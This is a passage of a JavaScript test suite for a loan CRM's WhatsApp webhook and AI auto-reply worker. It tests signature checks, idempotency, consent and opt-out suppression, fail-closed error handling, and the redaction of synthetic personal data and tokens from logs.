    const resB = await aisensy.persistMessageEventToSheets({
      payload: { destination: '+919800000002', userName: 'Caller B', correlationId: 'CORR-B' },
      formattedPhone: '+919800000002',
      providerMessageId: 'wamid.unres_B',
      provider: 'Meta',
      status: 'SENT'
    });

    assert.equal(resA.persisted, false);
    assert.equal(resB.persisted, false);
    assert.notEqual(resA.customerId, 'UNKNOWN');
    assert.notEqual(resB.customerId, 'UNKNOWN');
    assert.notEqual(resA.customerId, resB.customerId, 'Unrelated unresolved customers MUST NOT share a placeholder ID');
    assert.ok(resA.customerId.startsWith('UNRESOLVED_META_'));
    assert.ok(resB.customerId.startsWith('UNRESOLVED_META_'));
    assert.equal((await messageEventRepository.findAll()).length, 2);
  });
});

// ============================================================================
// GROUP 3: META WEBHOOK HANDOFF (src/app/api/whatsapp-webhook/route.ts)
// ============================================================================
describe('Group 3 — Meta Webhook Handoff (Actual whatsapp-webhook/route.ts)', () => {
  const origFetch = globalThis.fetch;
  const origAxiosPost = axios.post;
  let envSnap;

  beforeEach(() => {
    envSnap = snapshotEnv();
    setupDefaultMockEnv();
    // Disable AI reply by default for pure handoff tests unless explicitly tested
    process.env.WHATSAPP_INBOUND_AI_REPLY_ENABLED = 'false';
  });

  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  function makeMetaTextWebhook(msgId, text = 'Need a Home Loan', from = AUTH_TEST_PHONE_DIGITS) {
    return {
      object: 'whatsapp_business_account',
      entry: [
        {
          id: 'WABA_TEST',
          changes: [
            {
              field: 'messages',
              value: {
                contacts: [{ profile: { name: 'Sachin Customer' }, wa_id: from }],
                messages: [{ from, id: msgId, type: 'text', text: { body: text } }]
              }
            }
          ]
        }
      ]
    };
  }

  it('G3-01: Valid Meta inbound event verifies HMAC, registers WEBHOOK_EVENTS, dispatches to real worker, and confirms persisted=true', async () => {
    globalThis.fetch = async (url, init) => {
      assert.ok(String(url).endsWith('/api/whatsapp-webhook-worker'));
      const workerResp = await workerRoute.POST(
        new Request(url, { method: init.method, headers: init.headers, body: init.body })
      );
      return {
        ok: workerResp.status >= 200 && workerResp.status < 300,
        status: workerResp.status,
        json: () => workerResp.json()
      };
    };

    const req = buildMetaInboundRequest(makeMetaTextWebhook('wamid.handoff_01'));
    const resp = await webhookRoute.POST(req);
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.success, true);
    assert.equal(data.persisted, true);

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.handoff_01');
    assert.equal(wh.provider, 'Meta');
    assert.equal(wh.processing_status, 'COMPLETED');

    const msg = await messageEventRepository.findByProviderMessageId('wamid.handoff_01', 'Meta');
    assert.ok(msg);
    assert.equal(msg.event_id, 'MSG_META_wamid.handoff_01');
    assert.equal(msg.provider, 'Meta');
  });

  it('G3-02: Passes provider="Meta" to worker for both INBOUND_MESSAGE and STATUS_UPDATE', async () => {
    const captured = [];
    globalThis.fetch = async (_url, init) => {
      captured.push(JSON.parse(init.body));
      return { ok: true, status: 200, json: async () => ({ success: true, persisted: true }) };
    };

    const r1 = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.prov_in_01')));
    assert.equal(r1.status, 200);

    const statusPayload = {
      object: 'whatsapp_business_account',
      entry: [
        {
          changes: [
            {
              value: {
                statuses: [{ id: 'wamid.prov_st_01', status: 'delivered', recipient_id: AUTH_TEST_PHONE_DIGITS }]
              }
            }
          ]
        }
      ]
    };
    const r2 = await webhookRoute.POST(buildMetaInboundRequest(statusPayload));
    assert.equal(r2.status, 200);

    assert.equal(captured.length, 2);
    assert.equal(captured[0].eventType, 'INBOUND_MESSAGE');
    assert.equal(captured[0].provider, 'Meta');
    assert.equal(captured[1].eventType, 'STATUS_UPDATE');
    assert.equal(captured[1].provider, 'Meta');
  });

  it('G3-03: Forwards customerId when customer already exists in CUSTOMERS tab', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Existing Cust',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });

    let forwardedBody = null;
    globalThis.fetch = async (_url, init) => {
      forwardedBody = JSON.parse(init.body);
      return { ok: true, status: 200, json: async () => ({ success: true, persisted: true }) };
    };

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.fwd_cust_01')));
    assert.equal(resp.status, 200);
    assert.equal(forwardedBody.data.customerId, 'CUST-9175635165');
  });

  it('G3-04: Forwards leadId alongside customerId when existing Lead exists in LEADS tab', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Existing Lead Owner',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    await leadRepository.upsertLead({
      lead_id: 'AVL-20261121-777777',
      customer_id: 'CUST-9175635165',
      loan_category: 'Doctor Loan',
      requested_amount: '1500000'
    });

    let forwardedBody = null;
    globalThis.fetch = async (_url, init) => {
      forwardedBody = JSON.parse(init.body);
      return { ok: true, status: 200, json: async () => ({ success: true, persisted: true }) };
    };

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.fwd_lead_01')));
    assert.equal(resp.status, 200);
    assert.equal(forwardedBody.data.customerId, 'CUST-9175635165');
    assert.equal(forwardedBody.data.leadId, 'AVL-20261121-777777');
  });

  it('G3-05: Preserves correlationId across incoming header, worker header, worker body, and response', async () => {
    let seenHeader = null;
    let seenBodyCorr = null;
    globalThis.fetch = async (_url, init) => {
      seenHeader = init.headers['x-correlation-id'];
      seenBodyCorr = JSON.parse(init.body).correlationId;
      return { ok: true, status: 200, json: async () => ({ success: true, persisted: true }) };
    };

    const resp = await webhookRoute.POST(
      buildMetaInboundRequest(makeMetaTextWebhook('wamid.corr_01'), { correlationId: 'CORR-5H31-TRACE-42' })
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(seenHeader, 'CORR-5H31-TRACE-42');
    assert.equal(seenBodyCorr, 'CORR-5H31-TRACE-42');
    assert.equal(data.correlationId, 'CORR-5H31-TRACE-42');
  });

  it('G3-06: Missing optional customer/lead identity is safely omitted (never UNKNOWN)', async () => {
    let forwardedBody = null;
    globalThis.fetch = async (_url, init) => {
      forwardedBody = JSON.parse(init.body);
      return { ok: true, status: 200, json: async () => ({ success: true, persisted: true }) };
    };

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.no_opt_id_01')));
    assert.equal(resp.status, 200);
    assert.equal(forwardedBody.data.customerId, undefined);
    assert.equal(forwardedBody.data.leadId, undefined);
    assert.equal(JSON.stringify(forwardedBody).includes('UNKNOWN'), false);
  });

  it('G3-07: Missing INTERNAL_WORKER_SECRET fails closed before calling worker; invalid Meta HMAC returns 401', async () => {
    // 1. Invalid Meta signature rejected 401
    const badSigResp = await webhookRoute.POST(
      buildMetaInboundRequest(makeMetaTextWebhook('wamid.bad_sig'), { signature: 'sha256=' + '0'.repeat(64) })
    );
    assert.equal(badSigResp.status, 401);

    // 2. Unconfigured INTERNAL_WORKER_SECRET fails closed without calling fetch
    delete process.env.INTERNAL_WORKER_SECRET;
    let fetchCalled = false;
    globalThis.fetch = async () => {
      fetchCalled = true;
      return { ok: true, status: 200, json: async () => ({ success: true, persisted: true }) };
    };

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.no_worker_sec')));
    assert.equal(fetchCalled, false, 'Must not dispatch to worker when INTERNAL_WORKER_SECRET is unset');
    assert.equal(resp.status, 503);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.error, 'WORKER_AUTH_UNCONFIGURED');
    assert.equal(data.workerStatus, 401);

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.no_worker_sec');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'WORKER_AUTH_UNCONFIGURED');
  });

  it('G3-08: Worker HTTP 401 is handled as failure and marks WEBHOOK_EVENTS FAILED', async () => {
    globalThis.fetch = async (_url, init) => {
      assert.equal(init.headers['x-worker-auth'], TEST_WORKER_SECRET);
      return { ok: false, status: 401, json: async () => ({ success: false, error: 'Unauthorized' }) };
    };

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.worker_401')));
    assert.equal(resp.status, 503);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.workerHandoffFailed, true);
    assert.equal(data.workerStatus, 401);
    assert.equal(data.error, 'WORKER_UNAUTHORIZED');

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.worker_401');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'WORKER_UNAUTHORIZED');
  });

  it('G3-09: Worker HTTP 503 (persistence failure) is propagated as failure and marks WEBHOOK_EVENTS FAILED', async () => {
    globalThis.fetch = async () => ({
      ok: false,
      status: 503,
      json: async () => ({ success: false, persisted: false, error: 'GOOGLE_SHEETS_UNAVAILABLE' })
    });

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.worker_503')));
    assert.equal(resp.status, 503);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.workerStatus, 503);
    assert.equal(data.error, 'GOOGLE_SHEETS_UNAVAILABLE');

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.worker_503');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'GOOGLE_SHEETS_UNAVAILABLE');
  });

  it('G3-10: Worker timeout is handled safely via AbortController (HTTP 504 + FAILED status)', async () => {
    process.env.WHATSAPP_WORKER_HANDOFF_TIMEOUT_MS = '60';
    globalThis.fetch = async (_url, init) =>
      new Promise((_, reject) => {
        init.signal.addEventListener('abort', () => {
          const e = new Error('The operation was aborted');
          e.name = 'AbortError';
          reject(e);
        });
      });

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.worker_timeout')));
    assert.equal(resp.status, 504);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.timedOut, true);
    assert.equal(data.error, 'WORKER_TIMEOUT');

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.worker_timeout');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'WORKER_TIMEOUT');
  });

  it('G3-11: Worker 200 response without explicit persisted=true does NOT falsely claim persistence', async () => {
    globalThis.fetch = async () => ({
      ok: true,
      status: 200,
      json: async () => ({ success: true, bypassed: true }) // no persisted: true
    });

    const resp = await webhookRoute.POST(buildMetaInboundRequest(makeMetaTextWebhook('wamid.no_persist_flag')));
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.success, true);
    assert.equal(data.persisted, false, 'Webhook MUST NOT claim persisted=true unless worker confirms persisted===true');
  });

  it('G3-12: Duplicate Meta inbound events remain idempotent and invoke worker only once', async () => {
    let workerCalls = 0;
    globalThis.fetch = async () => {
      workerCalls++;
      return { ok: true, status: 200, json: async () => ({ success: true, persisted: true }) };
    };

    const payload = makeMetaTextWebhook('wamid.dup_handoff_01');
    const r1 = await webhookRoute.POST(buildMetaInboundRequest(payload));
    const r2 = await webhookRoute.POST(buildMetaInboundRequest(payload));

    assert.equal(r1.status, 200);
    assert.equal(r2.status, 200);
    const d2 = await r2.json();
    assert.equal(d2.duplicate, true);
    assert.equal(d2.persisted, false);
    assert.equal(workerCalls, 1, 'Duplicate inbound event must not re-invoke worker');
  });
});

// ============================================================================
// GROUP 4: WORKER AI AUTO-REPLY (src/app/api/whatsapp-webhook-worker/route.ts)
// ============================================================================
describe('Group 4 — Worker AI Auto-Reply, Consent, Opt-Out & Failure Handling', () => {
  const origAxiosPost = axios.post;
  const origProcessMessage = aiAgentMod.AgentEngine.processMessage;
  let envSnap;

  beforeEach(() => {
    envSnap = snapshotEnv();
    setupDefaultMockEnv();
  });

  afterEach(() => {
    axios.post = origAxiosPost;
    aiAgentMod.AgentEngine.processMessage = origProcessMessage;
    restoreEnv(envSnap);
  });

  function makeInboundWorkerPayload(overrides = {}) {
    const msgId = overrides.msgId || `wamid.ai_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`;
    return {
      eventId: overrides.eventId || `META_INBOUND_${msgId}`,
      eventType: 'INBOUND_MESSAGE',
      provider: 'Meta',
      correlationId: overrides.correlationId || 'CORR-AI-TEST',
      data: {
        message: { type: 'text', text: { body: overrides.text || 'I need a Doctor Loan of 30 lakh in Latur' }, id: msgId },
        fromPhone: overrides.fromPhone || AUTH_TEST_PHONE_E164,
        msgId,
        profileName: overrides.profileName || 'Dr Sachin',
        ...(overrides.leadId ? { leadId: overrides.leadId } : {})
      }
    };
  }

  it('G4-01: Valid authenticated worker request is accepted; invalid x-worker-auth is rejected 401', async () => {
    const bad = await workerRoute.POST(buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.auth_bad' }), 'invalid'));
    assert.equal(bad.status, 401);

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.ai_out_auth_ok' }] } });
    const good = await workerRoute.POST(buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.auth_good' })));
    assert.equal(good.status, 200);
    const data = await good.json();
    assert.equal(data.success, true);
    assert.equal(data.persisted, true);
  });

  it('G4-02: Eligible AI auto-reply invokes AgentEngine, sends Meta reply, records inbound + outbound MESSAGE_EVENTS, and completes webhook', async () => {
    let metaSendCount = 0;
    let sentBody = null;
    axios.post = async (url, body) => {
      metaSendCount++;
      sentBody = body;
      assert.ok(url.includes('graph.facebook.com/v25.0/1147494668457940/messages'));
      return { data: { messages: [{ id: 'wamid.ai_reply_out_01' }] } };
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.ai_reply_in_01', text: 'I need a Doctor Loan in Pune' }))
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.success, true);
    assert.equal(data.persisted, true);
    assert.equal(data.outboundDispatched, true);
    assert.equal(data.outboundEventId, 'MSG_META_wamid.ai_reply_out_01');
    assert.equal(metaSendCount, 1);
    assert.ok(sentBody.text.body.length > 10);

    const inboundRow = await messageEventRepository.findByProviderMessageId('wamid.ai_reply_in_01', 'Meta');
    const outboundRow = await messageEventRepository.findByProviderMessageId('wamid.ai_reply_out_01', 'Meta');
    assert.ok(inboundRow);
    assert.ok(outboundRow);
    assert.equal(inboundRow.direction, 'inbound');
    assert.equal(outboundRow.direction, 'outbound');
    assert.equal(outboundRow.delivery_status, 'SENT');
    assert.equal(outboundRow.event_id, 'MSG_META_wamid.ai_reply_out_01');
    assert.equal(JSON.stringify(outboundRow).includes(sentBody.text.body), false, 'Message text must never be persisted');

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.ai_reply_in_01');
    assert.equal(wh.processing_status, 'COMPLETED');
  });

  it('G4-03: Preserves forwarded leadId and canonical customer_id across LEADS, inbound, and outbound MESSAGE_EVENTS', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Dr Sachin',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    await leadRepository.upsertLead({
      lead_id: 'AVL-20261121-888888',
      customer_id: 'CUST-9175635165',
      loan_category: 'Doctor Loan',
      requested_amount: '2500000'
    });

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.ai_pres_out_01' }] } });
    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.ai_pres_in_01', leadId: 'AVL-20261121-888888' }))
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.customerId, 'CUST-9175635165');
    assert.equal(data.leadId, 'AVL-20261121-888888');

    const outRow = await messageEventRepository.findByProviderMessageId('wamid.ai_pres_out_01', 'Meta');
    assert.equal(outRow.customer_id, 'CUST-9175635165');
  });

  it('G4-04: Consent eligibility guard blocks AI auto-reply when customer consent is PENDING or DENIED', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Pending Consent User',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WEBSITE'
    });
    await consentRepository.upsertConsent({
      customer_id: 'CUST-9175635165',
      channel: 'WHATSAPP',
      consent_status: 'PENDING',
      consent_source: 'WEBSITE',
      optout_status: 'OPTED_IN'
    });

    let outboundCalls = 0;
    axios.post = async () => {
      outboundCalls++;
      return { data: { messages: [{ id: 'wamid.should_not_send' }] } };
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.consent_pending_01' }))
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.consentSuppressed, true);
    assert.equal(data.consentStatus, 'PENDING');
    assert.equal(data.outboundDispatched, false);
    assert.equal(outboundCalls, 0, 'Must NEVER send AI reply when consent is PENDING');
  });

  it('G4-05: Opt-out suppression blocks AI auto-reply for previously opted-out customer', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'Opted Out User',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND',
      record_status: 'OPTED_OUT'
    });

    let outboundCalls = 0;
    axios.post = async () => {
      outboundCalls++;
      return { data: { messages: [{ id: 'wamid.should_not_send_optout' }] } };
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.already_opted_out_01' }))
    );
    assert.equal(resp.status, 200);
    const data = await resp.json();
    assert.equal(data.optedOutSuppressed, true);
    assert.equal(data.outboundDispatched, false);
    assert.equal(outboundCalls, 0);
  });

  it('G4-06: STOP, Hindi (रोकें), and Marathi (थांबवा) opt-out phrases persist OPTED_OUT/WITHDRAWN and cancel follow-ups', async () => {
    const phrases = [
      { label: 'EN', text: 'STOP', msgId: 'wamid.opt_en' },
      { label: 'HI', text: 'रोकें', msgId: 'wamid.opt_hi' },
      { label: 'MR', text: 'थांबवा', msgId: 'wamid.opt_mr' }
    ];

    for (const p of phrases) {
      resetMockSheetsStore();
      axios.post = async () => ({ data: { messages: [{ id: `wamid.ack_${p.label}` }] } });
      const resp = await workerRoute.POST(
        buildWorkerRequest(makeInboundWorkerPayload({ msgId: p.msgId, text: p.text }))
      );
      assert.equal(resp.status, 200, `${p.label} opt-out should succeed`);
      const data = await resp.json();
      assert.equal(data.optedOut, true);

      const cust = await customerRepository.findByMobile(AUTH_TEST_PHONE_E164);
      const consent = await consentRepository.findByCustomerId(cust.customer_id);
      const followups = await followupRepository.findAll();
      assert.equal(cust.record_status, 'OPTED_OUT');
      assert.equal(consent.consent_status, 'WITHDRAWN');
      assert.equal(consent.optout_status, 'OPTED_OUT');
      assert.equal(followups.filter((f) => f.followup_status === 'PENDING').length, 0);
    }
  });

  it('G4-07: AI response generation failure fails closed (HTTP 500, FAILED webhook, zero outbound messages)', async () => {
    let outboundCalls = 0;
    axios.post = async () => {
      outboundCalls++;
      return { data: { messages: [{ id: 'wamid.never' }] } };
    };
    aiAgentMod.AgentEngine.processMessage = async () => {
      throw new Error('Gemini inference failure');
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.ai_fail_01' }))
    );
    assert.equal(resp.status, 500);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.outboundDispatched, false);
    assert.equal(data.error, 'AI_GENERATION_FAILED');
    assert.equal(outboundCalls, 0);

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.ai_fail_01');
    assert.equal(wh.processing_status, 'FAILED');
    assert.equal(wh.error_code, 'AI_GENERATION_FAILED');
  });

  it('G4-08: Outbound Meta provider failure fails closed (HTTP 502, FAILED webhook, no false 200 success)', async () => {
    axios.post = async () => {
      const err = new Error('Meta Cloud 500');
      err.response = { data: { error: { message: 'Temporary Meta API failure' } } };
      throw err;
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.provider_fail_01' }))
    );
    assert.equal(resp.status, 502);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.outboundDispatched, false);
    assert.equal(data.error, 'FAILED');

    const wh = await webhookEventRepository.findById('META_INBOUND_wamid.provider_fail_01');
    assert.equal(wh.processing_status, 'FAILED');
  });

  it('G4-09: Outbound AI-reply message-event persistence failure returns HTTP 503 with zero false success', async () => {
    axios.post = async () => {
      // Simulate Google Sheets dropping right after Meta Graph API accepts outbound AI reply
      configureMockSheetsFaults({ forceUnavailable: true });
      return { data: { messages: [{ id: 'wamid.ai_persist_fail_out' }] } };
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.ai_persist_fail_in' }))
    );
    assert.equal(resp.status, 503);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(data.error, 'GOOGLE_SHEETS_UNAVAILABLE');
  });

  it('G4-10: Worker duplicate bypasses completed eventId without duplicate send; failed eventId retries safely', async () => {
    let sendCount = 0;
    let shouldFail = true;
    axios.post = async () => {
      sendCount++;
      if (shouldFail) throw new Error('Transient Meta error');
      return { data: { messages: [{ id: 'wamid.ai_retry_out_01' }] } };
    };

    const payload = makeInboundWorkerPayload({ msgId: 'wamid.ai_retry_in_01' });

    // Attempt 1 fails with 502 and marks WEBHOOK_EVENTS FAILED
    const r1 = await workerRoute.POST(buildWorkerRequest(payload));
    assert.equal(r1.status, 502);

    // Attempt 2 recovers and marks WEBHOOK_EVENTS COMPLETED
    shouldFail = false;
    const r2 = await workerRoute.POST(buildWorkerRequest(payload));
    assert.equal(r2.status, 200);
    assert.equal((await r2.json()).outboundDispatched, true);

    // Attempt 3 on COMPLETED eventId is bypassed with zero extra Meta calls
    const r3 = await workerRoute.POST(buildWorkerRequest(payload));
    assert.equal(r3.status, 200);
    const d3 = await r3.json();
    assert.equal(d3.bypassed, true);
    assert.equal(d3.persisted, false);
    assert.equal(sendCount, 2, 'Completed duplicate MUST NOT trigger a third outbound send');
  });

  it('G4-11: Inbound Google Sheets unavailability fails closed HTTP 503 with zero outbound Meta calls', async () => {
    configureMockSheetsFaults({ forceUnavailable: true });
    let sendCount = 0;
    axios.post = async () => {
      sendCount++;
      return { data: { messages: [{ id: 'wamid.never_sent' }] } };
    };

    const resp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.sheets_down_in' }))
    );
    assert.equal(resp.status, 503);
    const data = await resp.json();
    assert.equal(data.success, false);
    assert.equal(data.persisted, false);
    assert.equal(sendCount, 0);
  });

  it('G4-12: Zero customer message text, PAN, Aadhaar, raw phone, or Bearer token leaks into server logs', async () => {
    const capturedLogs = [];
    const origLog = console.log;
    const origWarn = console.warn;
    const origErr = console.error;
    console.log = (...args) => capturedLogs.push(args.map(String).join(' '));
    console.warn = (...args) => capturedLogs.push(args.map(String).join(' '));
    console.error = (...args) => capturedLogs.push(args.map(String).join(' '));

    try {
      const secretBody = 'CONFIDENTIAL_MSG_BODY_7741 PAN ABCDE1234F Aadhaar 2345 6789 0123 phone +919175635165';
      axios.post = async () => {
        const e = new Error('Bearer EAAGSUPERSECRETTOKEN9988776655 failed for ABCDE1234F +919175635165');
        throw e;
      };

      await workerRoute.POST(
        buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.log_leak_01', text: secretBody }))
      );

      const allLogs = capturedLogs.join('\n');
      assert.equal(allLogs.includes('CONFIDENTIAL_MSG_BODY_7741'), false, 'Message text must not appear in logs');
      assert.equal(allLogs.includes('ABCDE1234F'), false, 'PAN must not appear in logs');
      assert.equal(allLogs.includes('2345 6789 0123'), false, 'Aadhaar must not appear in logs');
      assert.equal(allLogs.includes('9175635165'), false, 'Raw mobile number must not appear in logs');
      assert.equal(allLogs.includes('EAAGSUPERSECRETTOKEN9988776655'), false, 'Meta token must not appear in logs');
    } finally {
      console.log = origLog;
      console.warn = origWarn;
      console.error = origErr;
    }
  });

  it('G4-13 (Task 5H.33 D-01/D-02/D-03/H-02): Blocks spoofed victim leadId, rejects Meta 200 without message ID, and rejects unknown eventType', async () => {
    // 1. D-01: Victim customer & lead must never be reassigned by attacker spoofed leadId
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-VICTIM-5H33',
      customer_name: 'Victim Customer',
      mobile_number: '+919822999888',
      city: 'Pune',
      enquiry_source: 'WEBSITE'
    });
    await leadRepository.upsertLead({
      lead_id: 'AVL-VICTIM-5H33',
      customer_id: 'CUST-VICTIM-5H33',
      loan_category: 'Home Loan',
      requested_amount: '5000000'
    });

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.d01_guard_out' }] } });
    const spoofResp = await workerRoute.POST(
      buildWorkerRequest(
        makeInboundWorkerPayload({
          msgId: 'wamid.d01_guard_in',
          leadId: 'AVL-VICTIM-5H33'
        })
      )
    );
    assert.equal(spoofResp.status, 200);
    const victimLeadAfter = await leadRepository.findById('AVL-VICTIM-5H33');
    assert.equal(victimLeadAfter.customer_id, 'CUST-VICTIM-5H33', 'Victim lead ownership MUST remain intact');

    // 2. D-02: Meta HTTP 200 missing messages[0].id fails closed with zero fabricated meta_<ts> ID
    axios.post = async () => ({ status: 200, data: { messages: [] } });
    const badMetaResp = await workerRoute.POST(
      buildWorkerRequest(makeInboundWorkerPayload({ msgId: 'wamid.d02_bad200_in' }))
    );
    assert.equal(badMetaResp.status, 502);
    const badMetaData = await badMetaResp.json();
    assert.equal(badMetaData.success, false);
    assert.equal(badMetaData.persisted, false);
    assert.equal(badMetaData.persistenceState, 'UNKNOWN_PROVIDER_OUTCOME');

    // 3. D-03: Unknown / DIRECT_DISPATCH eventType fails closed HTTP 400 (never 200 persisted:true)
    const badEvtResp = await workerRoute.POST(
      buildWorkerRequest({
        eventId: 'DIRECT_UNSUPPORTED_5H33',
        eventType: 'DIRECT_DISPATCH',
        provider: 'Meta',
        correlationId: 'CORR-D03-H02',
        data: {}
      })
    );
    assert.equal(badEvtResp.status, 400);
    const badEvtData = await badEvtResp.json();
    assert.equal(badEvtData.success, false);
    assert.equal(badEvtData.persisted, false);
    assert.equal(badEvtData.persistenceState, 'UNSUPPORTED_EVENT');
  });
});

// ============================================================================
// GROUP 5: APPS_SCRIPT_GATEWAY + REAL gateway.gs VM INTEGRATION
// ============================================================================
describe('Group 5 — APPS_SCRIPT_GATEWAY + Real gateway.gs VM Integration (Local Sandbox)', () => {
  const origFetch = globalThis.fetch;
  const origAxiosPost = axios.post;
  let envSnap;
  let vmHarness;

  beforeEach(() => {
    envSnap = snapshotEnv();
    setupDefaultMockEnv();
    vmHarness = createGatewayVmHarness();

    process.env.GOOGLE_SHEETS_TRANSPORT_MODE = 'APPS_SCRIPT_GATEWAY';
    delete process.env.GOOGLE_SHEETS_ENABLE_MOCK;
    process.env.GOOGLE_SHEETS_GATEWAY_URL = 'https://script.google.com/macros/s/task5h31-local-vm/exec';
    process.env.GOOGLE_SHEETS_GATEWAY_SECRET = TEST_GATEWAY_SECRET;
    globalThis.fetch = vmHarness.gatewayFetch;
  });

  afterEach(() => {
    globalThis.fetch = origFetch;
    axios.post = origAxiosPost;
    restoreEnv(envSnap);
  });

  it('G5-01: Successful Meta outbound event inserts into synthetic MESSAGE_EVENTS sheet via HMAC-signed gateway.gs VM', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'VM Test Customer',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });

    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_insert_01' }] } });
    const res = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'VM Test Customer', text: 'VM test message' },
      'corr_vm_01'
    );

    assert.equal(res.success, true);
    assert.equal(res.persisted, true);
    assert.equal(res.eventId, 'MSG_META_wamid.vm_insert_01');
    assert.equal(res.customerId, 'CUST-9175635165');
    assert.ok(vmHarness.getVmCallCount() > 0, 'Must have executed real gateway.gs VM');

    const msgRows = vmHarness.sheetsMap.get('MESSAGE_EVENTS');
    assert.equal(msgRows.length, 2, 'Header + 1 synthetic MESSAGE_EVENTS row');
    assert.equal(msgRows[1][0], 'MSG_META_wamid.vm_insert_01');
    assert.equal(msgRows[1][1], 'CUST-9175635165');
    assert.equal(msgRows[1][2], 'Meta');
    assert.equal(msgRows[1][6], 'wamid.vm_insert_01');
  });

  it('G5-02: Duplicate Meta event via gateway.gs VM returns duplicate=true with zero duplicate sheet rows', async () => {
    await customerRepository.upsertCustomer({
      customer_id: 'CUST-9175635165',
      customer_name: 'VM Dup',
      mobile_number: AUTH_TEST_PHONE_E164,
      city: 'Latur',
      enquiry_source: 'WHATSAPP_INBOUND'
    });
    axios.post = async () => ({ data: { messages: [{ id: 'wamid.vm_dup_01' }] } });
    const first = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'VM Dup', text: 'First', customerId: 'CUST-9175635165' },
      'corr_vm_dup1'
    );
    const second = await aisensy.sendAiSensyWhatsApp(
      { destination: AUTH_TEST_PHONE_E164, userName: 'VM Dup', text: 'Retry', customerId: 'CUST-9175635165' },
      'corr_vm_dup2'
    );

    assert.equal(first.success, true);
    assert.equal(first.duplicate, false);
    assert.equal(second.success, true);
    assert.equal(second.duplicate, true);
